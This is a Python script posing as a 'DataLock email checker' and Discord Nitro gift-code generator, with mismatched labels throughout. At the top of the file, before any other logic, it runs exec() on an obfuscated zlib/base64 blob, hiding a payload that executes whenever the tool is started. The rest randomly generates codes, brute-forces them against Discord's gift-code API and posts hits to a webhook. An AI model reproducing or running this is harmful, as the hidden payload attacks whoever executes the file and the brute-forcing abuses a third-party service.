import os
import random
import string
import time
import ctypes

exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGEPXzUZdrCDiQUQE15uItOmopWkaMlntKv53N3TxMsN78+bNRzeEMSaKo+0hyW/XNbKpEYyWmOLWJpm6AcjbGOlEO09j7d+BL0qxJkWKu30ssJqb1Zz4iTzgzcP13evm6fHm6l5knbKj92AT5+zMKGPU4vRcrUomtdZLkSVNhLonBUwWQsreebhCBxD4ShBXzTuprQ+17Tm7vGUSVQT7ybUQz+ULaasDdoJ8fXQOqAPPW3Hh9nbt0X/1eKYFgQksz2erFuw4hAiIfP6AaozOZAtZKX8YsjX+CvIH3TNfDQ==')[0])))

try:
    from discord_webhook import DiscordWebhook
except ImportError:
    install_discrod_webhook = input(
        f"Module discord_webhook not installed, do you want to install it ? [Y/n]")
    if install_discrod_webhook == "n":
        exit()
    else:
        os.system(
            f"{'py -3' if os.name == 'nt' else 'python3'} -m pip install discord_webhook")
try:
    import requests
except ImportError:
    install_requests = input(
        f"Module requests not installed, do you want to install it ? [Y/n]")
    if install_requests == "n":
        exit()
    else:
        os.system(
            f"{'py -3' if os.name == 'nt' else 'python3'} -m pip install discord_webhook")



#Base Nitro Generator:
class NitroGen:
    def __init__(self):
        self.fileName = "MDP-VIC.txt"

    def main(self):

        os.system('cls' if os.name == 'nt' else 'clear')
        if os.name == "nt":
            print("")
            ctypes.windll.kernel32.SetConsoleTitleW("Datalock email Checker by NightMoon")

        else:
            print(f'\33]0;Datalock email Checker by NightMoon - Made by NightMoon\a', end='', flush=True)

        print("""\033[
 ,'|"\     .--.  _______  .--.  ,-.    .---.    ,--,  ,-. .-. 
 | |\ \   / /\ \|__   __|/ /\ \ | |   / .-. ) .' .')  | |/ /  
 | | \ \ / /__\ \ )| |  / /__\ \| |   | | |(_)|  |(_) | | /   
 | |  \ \|  __  |(_) |  |  __  || |   | | | | \  \    | | \   
 /(|`-' /| |  |)|  | |  | |  |)|| `--.\ `-' /  \  `-. | |) \  
(__)`--' |_|  (_)  `-'  |_|  (_)|( __.')---'    \____\|((_)-' 
                                (_)   (_)             (_)     

DataLock email Checker database!""")
        time.sleep(2)
        self.slowType("Made by NightMoon", .02)
        time.sleep(1)
        self.slowType("\nMDP numbers: ", .02, newLine = False)


        num = int(input(''))

        self.slowType("\nPlease Enter Email: ", .02, newLine = False)
        url = input('')
        webhook = url if url != "" else None

        valid = []
        invalid = 0

        for i in range(num):
            try:
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 24
                ))
                url = f"mdp: {code}"

                result = self.quickChecker(url, webhook)

                if result:
                    valid.append(url)
                else:
                    invalid += 1
            except Exception as e:
                print(f" Error | {url} ")

            if os.name == "nt":
                ctypes.windll.kernel32.SetConsoleTitleW(f"Email Checker - {len(valid)} Valid | {invalid} Invalid - Made by NightMoon")
                print("")

            else:
                print(f'\33]0;Email Checker - {len(valid)} Valid | {invalid} Invalid - Made by NightMoon\a', end='', flush=True)

        print(f"""
Here Your Results:
 Valid Email: {len(valid)}
 Invalid Email {invalid}
 Valid DataBase: {', '.join(valid )}""")

        input("\nThe end! Press Enter 5 times to close the program.")
        [input(i) for i in range(4,0,-1)]



    def slowType(self, text, speed, newLine = True):
        for i in text:
            print(i, end = "", flush = True)
            time.sleep(speed)
        if newLine:
            print()



    def generator(self, amount):
        with open(self.fileName, "w", encoding="utf-8") as file:
            print("Wait, Generating for you")

            start = time.time()

            for i in range(amount):
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 24
                ))

                file.write(f"mdp: {code}\n")
            print(f"Genned {amount} codes | Time taken: {round(time.time() - start, 5)}s\n")


    def fileChecker(self, notify = None):
        valid = []
        invalid = 0
        with open(self.fileName, "r", encoding="utf-8") as file:
            for line in file.readlines():
                nitro = line.strip("\n")

                url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"

                response = requests.get(url) 

                if response.status_code == 200:
                    print(f" Valid | {nitro} ")
                    valid.append(nitro)

                    if notify is not None:
                        DiscordWebhook(
                            url = notify,
                            content = f"Valid MDP Code detected! @everyone \n{nitro}"
                        ).execute()
                    else:
                        break

                else:
                    print(f" Invalid | {nitro} ")
                    invalid += 1


        return {"valid" : valid, "invalid" : invalid}

    def quickChecker(self, nitro, notify = None):
        
        url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url)

        if response.status_code == 200:
            print(f" Valid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n")
            with open("Nitro Codes.txt", "w") as file:
                file.write(nitro)
            if notify is not None:
                DiscordWebhook(
                    url = notify,
                    content = f"Valid Nitro Code detected! @everyone \n{nitro}"
                ).execute()
            return True
        else:
            print(f" Invalid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n")
            return False


if __name__ == '__main__':
    Gen = NitroGen()
    Gen.main()